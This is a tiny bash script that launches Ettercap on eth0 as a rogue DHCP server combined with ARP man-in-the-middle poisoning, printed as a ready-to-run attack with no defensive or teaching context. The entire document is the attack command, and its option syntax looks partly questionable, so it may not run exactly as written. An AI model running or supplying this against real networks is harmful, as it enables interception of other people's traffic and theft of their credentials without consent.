#!/bin/bash
# Rogue DHCP with Ettercap

echo "[+] Launching Rogue DHCP Server via Ettercap..."
sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote